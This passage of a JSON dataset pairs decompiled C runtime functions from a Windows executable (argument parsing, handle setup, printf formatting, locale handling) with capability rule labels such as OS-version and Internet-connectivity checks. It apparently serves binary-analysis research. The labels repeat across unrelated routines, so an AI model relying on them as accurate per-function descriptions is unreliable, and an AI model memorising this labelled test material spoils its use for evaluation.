arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x468721) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x468721) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1212
    },
    "0041819f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041819f(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.0041101f(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x4685cc = 0x20;\n        *0x4685e0 = puVar3;\n        for (; puVar3 < *0x4685e0 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x4685cc < iVar8) {\n                puVar3 = 0x4685e4;\n                do {\n                    puVar5 = fcn.0041101f(0x480);\n                    iVar6 = *0x4685cc;\n                    if (puVar5 == NULL) break;\n                    *0x4685cc = *0x4685cc + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x4685cc < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x4685e0) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.0041c315(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x4685e0 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.0041c315(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x4685cc);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1268
    },
    "00418790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00418790(ushort *param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_EDI;\n    \n    if (((*(unaff_EDI + 0xc) & 0x40) == 0) || (*(unaff_EDI + 8) != 0)) {\n        do {\n            if (param_2 < 1) {\n                return;\n            }\n            param_2 = param_2 + -1;\n            fcn.00418746(*param_1);\n            param_1 = param_1 + 1;\n        } while (*in_EAX != -1);\n    }\n    else {\n        *in_EAX = *in_EAX + param_2;\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004187e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004187e2(uint param_1, uint16_t *param_2, int32_t **param_3)\n\n{\n    uint16_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t *piVar7;\n    uint16_t uVar8;\n    uint32_t unaff_EBX;\n    uint8_t *arg_ch;\n    bool bVar9;\n    int64_t iVar10;\n    int32_t *piStack1116;\n    int32_t *piStack1112;\n    uint8_t *puStack1104;\n    uint32_t uStack1100;\n    uint uStack1096;\n    int32_t iStack1092;\n    int32_t iStack1088;\n    int32_t iStack1084;\n    int32_t iStack1080;\n    int32_t *piStack1076;\n    uchar uStack1072;\n    uchar uStack1071;\n    ushort uStack1068;\n    int16_t iStack1066;\n    int32_t iStack1064;\n    int32_t *piStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    int32_t *piStack1048;\n    int32_t iStack1044;\n    int32_t *piStack1040;\n    uint32_t uStack1036;\n    int32_t aiStack1032 [127];\n    uint uStack521;\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    uVar8 = *param_2;\n    arg_ch = unaff_EBX & 0xffff0000 | uVar8;\n    iStack1044 = 0;\n    iStack1052 = 0;\n    piStack1076 = NULL;\n    iVar6 = 0;\n    puVar1 = param_2;\n    ppiVar2 = param_3;\n    while (uVar8 != 0) {\n        param_2 = puVar1 + 1;\n        if (iStack1052 < 0) break;\n        uVar8 = arg_ch;\n        if ((uVar8 < 0x20) || (0x78 < uVar8)) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *((arg_ch & 0xffff) + 0x455f68) & 0xf;\n        }\n        iStack1092 = *(iVar6 + 0x455f88 + uVar4 * 8) >> 4;\n        param_3 = ppiVar2;\n    // switch table (8 cases) at 0x418ff2\n        switch(iStack1092) {\n        case 0:\ncode_r0x00418a29:\n            iStack1064 = 1;\n            fcn.00418746(arg_ch);\n            break;\n        case 1:\n            piStack1040 = 0xffffffff;\n            uStack1096 = 0;\n            iStack1080 = 0;\n            piStack1060 = NULL;\n            iStack1056 = 0;\n            uStack1036 = 0;\n            iStack1064 = 0;\n            break;\n        case 2:\n            uVar4 = arg_ch & 0xffff;\n            if (uVar4 == 0x20) {\n                uStack1036 = uStack1036 | 2;\n            }\n            else if (uVar4 == 0x23) {\n                uStack1036 = uStack1036 | 0x80;\n            }\n            else if (uVar4 == 0x2b) {\n                uStack1036 = uStack1036 | 1;\n            }\n            else if (uVar4 == 0x2d) {\n                uStack1036 = uStack1036 | 4;\n            }\n            else if (uVar4 == 0x30) {\n                uStack1036 = uStack1036 | 8;\n            }\n            break;\n        case 3:\n            if (uVar8 == 0x2a) {\n                piStack1060 = *ppiVar2;\n                param_3 = ppiVar2 + 1;\n                if (piStack1060 < 0) {\n                    uStack1036 = uStack1036 | 4;\n                    piStack1060 = -piStack1060;\n                }\n            }\n            else {\n                piStack1060 = ((arg_ch & 0xffff) - 0x30) + piStack1060 * 10;\n            }\n            break;\n        case 4:\n            piStack1040 = NULL;\n            break;\n        case 5:\n            if (uVar8 == 0x2a) {\n                piStack1040 = *ppiVar2;\n                param_3 = ppiVar2 + 1;\n                if (piStack1040 < 0) {\n                    piStack1040 = 0xffffffff;\n                }\n            }\n            else {\n                piStack1040 = ((arg_ch & 0xffff) - 0x30) + piStack1040 * 10;\n            }\n            break;\n        case 6:\n            uVar4 = arg_ch & 0xffff;\n            if (uVar4 == 0x49) {\n                uVar8 = *param_2;\n                if ((uVar8 == 0x36) && (puVar1[2] == 0x34)) {\n                    param_2 = puVar1 + 3;\n                    uStack1036 = uStack1036 | 0x8000;\n                }\n                else if ((uVar8 == 0x33) && (puVar1[2] == 0x32)) {\n                    param_2 = puVar1 + 3;\n                    uStack1036 = uStack1036 & 0xffff7fff;\n                }\n                else if (((((uVar8 != 100) && (uVar8 != 0x69)) && (uVar8 != 0x6f)) &&\n                         ((uVar8 != 0x75 && (uVar8 != 0x78)))) && (uVar8 != 0x58)) {\n                    iStack1092 = 0;\n                    goto code_r0x00418a29;\n                }\n            }\n            else if (uVar4 == 0x68) {\n                uStack1036 = uStack1036 | 0x20;\n            }\n            else if (uVar4 == 0x6c) {\n                uStack1036 = uStack1036 | 0x10;\n            }\n            else if (uVar4 == 0x77) {\n                uStack1036 = uStack1036 | 0x800;\n            }\n            break;\n        case 7:\n            uVar4 = arg_ch & 0xffff;\n            if (uVar4 < 0x68) {\n                if (uVar4 < 0x65) {\n                    if (uVar4 < 0x59) {\n                        if (uVar4 != 0x58) {\n                            if (uVar4 == 0x43) {\n                                if ((uStack1036 & 0x830) == 0) {\n                                    uStack1036 = uStack1036 | 0x20;\n                                }\n                                goto code_r0x00418b37;\n                            }\n                            if ((uVar4 != 0x45) && (uVar4 != 0x47)) {\n                                if (uVar4 == 0x53) {\n                                    if ((uStack1036 & 0x830) == 0) {\n                                        uStack1036 = uStack1036 | 0x20;\n                                    }\n                                    goto code_r0x00418a95;\n                                }\n                                goto code_r0x00418eb0;\n                            }\n                            uStack1096 = 1;\n                            arg_ch = arg_ch + 0x20;\n                            goto code_r0x00418b0c;\n                        }\ncode_r0x00418d56:\n                        iStack1088 = 7;\ncode_r0x00418d59:\n                        iStack1044 = 0x10;\n                        if ((uStack1036 & 0x80) != 0) {\n                            iStack1066 = iStack1088 + 0x51;\n                            uStack1068 = 0x30;\n                            iStack1056 = 2;\n                        }\n                        goto code_r0x00418b99;\n                    }\n                    if (uVar4 == 0x5a) {\n                        param_3 = ppiVar2 + 1;\n                        piVar7 = *ppiVar2;\n                        piVar5 = *0x464388;\n                        piVar3 = *0x464388;\n                        if ((piVar7 == NULL) || (piStack1048 = piVar7[1],  piVar3 = *0x464388,  piStack1048 == NULL))\n                        goto code_r0x00418cd6;\n                        iStack1044 = *piVar7;\n                        if ((uStack1036 & 0x800) == 0) {\n                            iStack1064 = 0;\n                        }\n                        else {\n                            iStack1044 = iStack1044 / 2;\n                            iStack1064 = 1;\n                        }\n                    }\n                    else if (uVar4 == 99) {\ncode_r0x00418b37:\n                        uVar8 = *ppiVar2;\n                        uStack1100 = uVar8;\n                        iStack1064 = 1;\n                        if ((uStack1036 & 0x20) == 0) {\n                            aiStack1032[0]._0_2_ = uVar8;\n                        }\n                        else {\n                            uStack1072 = uVar8;\n                            uStack1071 = 0;\n                            iVar6 = fcn.0041bc43(aiStack1032, &uStack1072, *0x464920);\n                            if (iVar6 < 0) {\n                                iStack1080 = 1;\n                            }\n                        }\n                        iStack1044 = 1;\n                        param_3 = ppiVar2 + 1;\n                        piStack1048 = aiStack1032;\n                    }\n                    else if (uVar4 == 100) goto code_r0x00418b8e;\n                }\n                else {\ncode_r0x00418b0c:\n                    uStack1036 = uStack1036 | 0x40;\n                    piVar7 = aiStack1032;\n                    piVar5 = aiStack1032;\n                    if (piStack1040 < 0) {\n                        piStack1040 = 0x6;\n                    }\n                    else if (piStack1040 == NULL) {\n                        if (arg_ch == 0x67) {\n                            piStack1040 = 0x1;\n                        }\n                    }\n                    else {\n                        if (0x200 < piStack1040) {\n                            piStack1040 = 0x200;\n                        }\n                        if ((0xa3 < piStack1040) &&\n                           (piStack1048 = aiStack1032,  piStack1076 = fcn.0041101f(piStack1040 + 0x15d), \n                           piVar7 = piStack1076,  piVar5 = piStack1076,  piStack1076 == NULL)) {\n                            piStack1040 = 0xa3;\n                            piVar7 = aiStack1032;\n                            piVar5 = piStack1048;\n                        }\n                    }\n                    piStack1048 = piVar5;\n                    piStack1116 = *ppiVar2;\n                    param_3 = ppiVar2 + 2;\n                    piStack1112 = ppiVar2[1];\n                    (**0x464370)(&piStack1116, piVar7, arg_ch, piStack1040, uStack1096);\n                    uVar4 = uStack1036 & 0x80;\n                    if ((uVar4 != 0) && (piStack1040 == NULL)) {\n                        (**0x46437c)(piVar7);\n                    }\n                    if ((arg_ch == 0x67) && (uVar4 == 0)) {\n                        (**0x464374)(piVar7);\n                    }\n                    piVar5 = piVar7;\n                    piVar3 = piStack1048;\n                    if (*piVar7 == 0x2d) {\n                        uStack1036 = uStack1036 | 0x100;\n                        piVar5 = piVar7 + 1;\n                        piVar3 = piVar7 + 1;\n                    }\ncode_r0x00418cd6:\n                    piStack1048 = piVar3;\n                    iStack1044 = fcn.00411cb0(piVar5);\n                }\ncode_r0x00418eb0:\n                if (iStack1080 == 0) {\n                    if ((uStack1036 & 0x40) != 0) {\n                        if ((uStack1036 & 0x100) == 0) {\n                            if ((uStack1036 & 1) == 0) {\n                                if ((uStack1036 & 2) == 0) goto code_r0x00418eeb;\n                                uStack1068 = 0x20;\n                            }\n                            else {\n                                uStack1068 = 0x2b;\n                            }\n                        }\n                        else {\n                            uStack1068 = 0x2d;\n                        }\n                        iStack1056 = 1;\n                    }\ncode_r0x00418eeb:\n                    arg_ch = piStack1060 + (-iStack1044 - iStack1056);\n                    if ((uStack1036 & 0xc) == 0) {\n                        fcn.0041876b(0x20, arg_ch, param_1);\n                    }\n                    fcn.00418790(iStack1056);\n                    if (((uStack1036 & 8) != 0) && ((uStack1036 & 4) == 0)) {\n                        fcn.0041876b(0x30, arg_ch, param_1);\n                    }\n                    if ((iStack1064 == 0) && (0 < iStack1044)) {\n                        iStack1084 = iStack1044;\n                        piVar7 = piStack1048;\n                        do {\n                            iStack1084 = iStack1084 + -1;\n                            puStack1104 = fcn.0041bc43(&uStack1100, piVar7, *0x464920);\n                            if (puStack1104 < 1) break;\n                            fcn.00418746(uStack1100);\n                            piVar7 = piVar7 + puStack1104;\n                        } while (0 < iStack1084);\n                    }\n                    else {\n                        fcn.00418790(iStack1044);\n                    }\n                    if ((uStack1036 & 4) != 0) {\n                        fcn.0041876b(0x20, arg_ch, param_1);\n                    }\n                }\n            }\n            else {\n                if (uVar4 == 0x69) {\ncode_r0x00418b8e:\n                    uStack1036 = uStack1036 | 0x40;\ncode_r0x00418b92:\n                    iStack1044 = 10;\ncode_r0x00418b99:\n                    if ((uStack1036 & 0x8000) == 0) {\n                        param_3 = ppiVar2 + 1;\n                        if ((uStack1036 & 0x20) == 0) {\n                            piVar7 = *ppiVar2;\n                            if ((uStack1036 & 0x40) == 0) {\n                                piVar5 = NULL;\n                                goto code_r0x00418dfa;\n                            }\n                        }\n                        else if ((uStack1036 & 0x40) == 0) {\n                            piVar7 = *ppiVar2;\n                        }\n                        else {\n                            piVar7 = *ppiVar2;\n                        }\n                        piVar5 = piVar7 >> 0x1f;\n                    }\n                    else {\n                        piVar7 = *ppiVar2;\n                        piVar5 = ppiVar2[1];\n                        param_3 = ppiVar2 + 2;\n                    }\ncode_r0x00418dfa:\n                    if ((((uStack1036 & 0x40) != 0) && (piVar5 < 1)) && (piVar5 < 0)) {\n                        bVar9 = piVar7 != NULL;\n                        piVar7 = -piVar7;\n                        piVar5 = -(piVar5 + bVar9);\n                        uStack1036 = uStack1036 | 0x100;\n                    }\n                    if ((uStack1036 & 0x8000) == 0) {\n                        piVar5 = NULL;\n                    }\n                    iVar10 = CONCAT44(piVar5, piVar7);\n                    if (piStack1040 < 0) {\n                        piStack1040 = 0x1;\n                    }\n                    else {\n                        uStack1036 = uStack1036 & 0xfffffff7;\n                        if (0x200 < piStack1040) {\n                            piStack1040 = 0x200;\n                        }\n                    }\n                    if ((piVar7 | piVar5) == 0) {\n                        iStack1056 = 0;\n                    }\n                    piVar7 = &uStack521;\n                    while( true ) {\n                        arg_ch = iVar10;\n                        piVar5 = piStack1040 + -1;\n                        if ((piStack1040 < 1) && (iVar10 == 0)) break;\n                        piStack1040 = piVar5;\n                        iVar10 = fcn.0041c270();\n                        iVar6 = extraout_ECX + 0x30;\n                        if (0x39 < iVar6) {\n                            iVar6 = iVar6 + iStack1088;\n                        }\n                        *piVar7 = iVar6;\n                        piVar7 = piVar7 + -1;\n                        puStack1104 = arg_ch;\n                    }\n                    iStack1044 = &uStack521 + -piVar7;\n                    piStack1048 = piVar7 + 1;\n                    piStack1040 = piVar5;\n                    if (((uStack1036 & 0x200) != 0) && ((*piStack1048 != 0x30 || (iStack1044 == 0)))) {\n                        *piVar7 = 0x30;\n                        iStack1044 = &uStack521 + -piVar7 + 1;\n                        piStack1048 = piVar7;\n                    }\n                    goto code_r0x00418eb0;\n                }\n                if (uVar4 != 0x6e) {\n                    if (uVar4 == 0x6f) {\n                        iStack1044 = 8;\n                        if ((uStack1036 & 0x80) != 0) {\n                            uStack1036 = uStack1036 | 0x200;\n                        }\n                        goto code_r0x00418b99;\n                    }\n                    if (uVar4 == 0x70) {\n                        piStack1040 = 0x8;\n                        goto code_r0x00418d56;\n                    }\n                    if (uVar4 == 0x73) {\ncode_r0x00418a95:\n                        piVar7 = piStack1040;\n                        if (piStack1040 == 0xffffffff) {\n                            piVar7 = 0x7fffffff;\n                        }\n                        param_3 = ppiVar2 + 1;\n                        piStack1048 = *ppiVar2;\n                        if ((uStack1036 & 0x20) == 0) {\n                            if (piStack1048 == NULL) {\n                                piStack1048 = *0x46438c;\n                            }\n                            iStack1064 = 1;\n                            for (piVar5 = piStack1048; (piVar7 != NULL && (piVar7 = piVar7 + -1,  *piVar5 != 0));\n                                piVar5 = piVar5 + 2) {\n                            }\n                            iStack1044 = piVar5 - piStack1048 >> 1;\n                        }\n                        else {\n                            if (piStack1048 == NULL) {\n                                piStack1048 = *0x464388;\n                            }\n                            iStack1044 = 0;\n                            piVar5 = piStack1048;\n                            if (0 < piVar7) {\n                                do {\n                                    if (*piVar5 == 0) break;\n                                    if ((*(*0x46495c + 1 + *piVar5 * 2) & 0x80) != 0) {\n                                        piVar5 = piVar5 + 1;\n                                    }\n                                    piVar5 = piVar5 + 1;\n                                    iStack1044 = iStack1044 + 1;\n                                } while (iStack1044 < piVar7);\n                            }\n                        }\n                        goto code_r0x00418eb0;\n                    }\n                    if (uVar4 != 0x75) {\n                        if (uVar4 != 0x78) goto code_r0x00418eb0;\n                        iStack1088 = 0x27;\n                        goto code_r0x00418d59;\n                    }\n                    goto code_r0x00418b92;\n                }\n                param_3 = ppiVar2 + 1;\n                if ((uStack1036 & 0x20) == 0) {\n                    **ppiVar2 = iStack1052;\n                }\n                else {\n                    **ppiVar2 = iStack1052;\n                }\n                iStack1080 = 1;\n            }\n            if (piStack1076 != NULL) {\n                fcn.00411031(piStack1076);\n                piStack1076 = NULL;\n            }\n        }\n        uVar8 = *param_2;\n        arg_ch = arg_ch & 0xffff0000 | uVar8;\n        iVar6 = iStack1092;\n        puVar1 = param_2;\n        ppiVar2 = param_3;\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 4845
    },
    "0041944a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041944a(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_ch;\n    fcn.00411850(arg_8h, 0, 0x90);\n    if (*arg_ch != '\\0') {\n        if ((*arg_ch != '.') || (arg_ch[1] == '\\0')) {\n            arg_ch = NULL;\n            do {\n                uVar2 = fcn.0041a3a0(arg_8h_00, 0x4567a8);\n                if (uVar2 == 0) {\n                    return 0xffffffff;\n                }\n                cVar1 = arg_8h_00[uVar2];\n                if (arg_ch == NULL) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h;\n                    if (cVar1 == '.') {\n                        return 0xffffffff;\n                    }\n                }\n                else if (arg_ch == 0x1) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if (cVar1 == '_') {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x40;\n                }\n                else {\n                    if (arg_ch != 0x2) {\n                        return 0xffffffff;\n                    }\n                    if (0xf < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if ((cVar1 != '\\0') && (cVar1 != ',')) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x80;\n                }\n                fcn.0041c4a0(iVar3, arg_8h_00, uVar2);\n                if ((cVar1 == ',') || (cVar1 == '\\0')) {\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n                arg_8h_00 = arg_8h_00 + uVar2 + 1;\n            } while( true );\n        }\n        fcn.0041c4a0(arg_8h + 0x80, arg_ch + 1, 0xf);\n        *(arg_8h + 0x8f) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 546
    },
    "00419526": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00419526(uint param_1, int32_t param_2)\n\n{\n    fcn.004190f0(param_1, param_2);\n    if (*(param_2 + 0x40) != '\\0') {\n        fcn.00419426(param_1, 2, 0x4567b0, param_2 + 0x40);\n    }\n    if (*(param_2 + 0x80) != '\\0') {\n        fcn.00419426(param_1, 2, 0x4567ac, param_2 + 0x80);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0041966e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041966e(char *arg_8h, uchar *arg_ch, ushort *arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_94h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (arg_8h != NULL) {\n        if ((*arg_8h == 'C') && (arg_8h[1] == '\\0')) {\n            *arg_ch = 0x43;\n            arg_ch[1] = 0;\n            if (arg_10h != NULL) {\n                *arg_10h = 0;\n                arg_10h[1] = 0;\n                arg_10h[2] = 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 0;\n            }\n        }\n        else {\n            uVar1 = fcn.00411cb0(arg_8h);\n            if ((0x81 < uVar1) ||\n               ((iVar2 = fcn.00418650(0x464720, arg_8h),  iVar2 != 0 &&\n                (iVar2 = fcn.00418650(0x464698, arg_8h),  iVar2 != 0)))) {\n                iVar2 = fcn.0041944a(&var_94h, arg_8h);\n                if ((iVar2 != 0) || (iVar2 = fcn.0041e892(&var_94h, 0x46739c, &var_94h),  iVar2 == 0))\n                goto code_r0x004197bf;\n                *0x4673a4 = *0x4673a0;\n                fcn.00419526(0x464720, &var_94h);\n                if ((*arg_8h == '\\0') || (uVar1 = fcn.00411cb0(arg_8h),  0x81 < uVar1)) {\n                    arg_8h = 0x44da68;\n                }\n                *0x46471a = 0;\n                fcn.0041c4a0(0x464698, arg_8h, 0x82);\n            }\n            if (arg_10h != NULL) {\n                fcn.00411970(arg_10h, 0x46739c, 6);\n            }\n            if (arg_14h != NULL) {\n                fcn.00411970(arg_14h, 0x4673a4, 4);\n            }\n            fcn.004190f0(arg_ch, 0x464720);\n        }\n    }\ncode_r0x004197bf:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 623
    },
    "004197ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004197ca(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    int32_t in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint32_t arg_1ch;\n    uint32_t in_stack_fffffe50;\n    int32_t iStack420;\n    int32_t iStack404;\n    int32_t iStack400;\n    uchar uStack396;\n    uint8_t auStack395 [255];\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    iVar4 = fcn.0041966e(param_1, auStack140, &stack0xfffffe50, &iStack404);\n    if (iVar4 != 0) {\n        iVar9 = unaff_ESI * 0xc;\n        iVar4 = fcn.00418650(auStack140, *(iVar9 + 0x4647ac));\n        if (iVar4 != 0) {\n            iVar4 = fcn.00411cb0(auStack140);\n            iVar4 = fcn.0041101f(iVar4 + 1);\n            if (iVar4 != 0) {\n                arg_8h = *(iVar9 + 0x4647ac);\n                puVar1 = unaff_ESI * 4 + 0x4673a8;\n                arg_1ch = *puVar1;\n                iStack400 = unaff_ESI * 6 + 0x4674fc;\n                fcn.00411970(&stack0xfffffe3c, iStack400, 6);\n                iVar3 = *0x4673c0;\n                uVar5 = fcn.004190f0(iVar4, auStack140);\n                *(iVar9 + 0x4647ac) = uVar5;\n                *puVar1 = in_stack_fffffe50 & 0xffff;\n                fcn.00411970(iStack400, &stack0xfffffe50, 6);\n                uVar8 = *0x4647f0;\n                if (unaff_ESI == 2) {\n                    iStack400 = 0;\n                    *0x4673c0 = iStack404;\n                    iStack420 = *0x464694;\n                    piVar6 = 0x464670;\n                    iVar7 = *0x464690;\n                    do {\n                        if (iStack404 == *piVar6) {\n                            if (iStack400 != 0) {\n                                iVar2 = iStack400 * 8;\n                                *0x464670 = *(iVar2 + 0x464670);\n                                *0x464674 = *(iVar2 + 0x464674);\n                                *(iVar2 + 0x464670) = iVar7;\n                                *(iVar2 + 0x464674) = iStack420;\n                            }\n                            break;\n                        }\n                        in_stack_fffffe44 = *piVar6;\n                        iStack400 = iStack400 + 1;\n                        *piVar6 = iVar7;\n                        iVar2 = piVar6[1];\n                        piVar6[1] = iStack420;\n                        piVar6 = piVar6 + 2;\n                        iVar7 = in_stack_fffffe44;\n                        iStack420 = iVar2;\n                    } while (piVar6 < 0x464698);\n                    uVar8 = *0x464674;\n                    if (iStack400 == 5) {\n        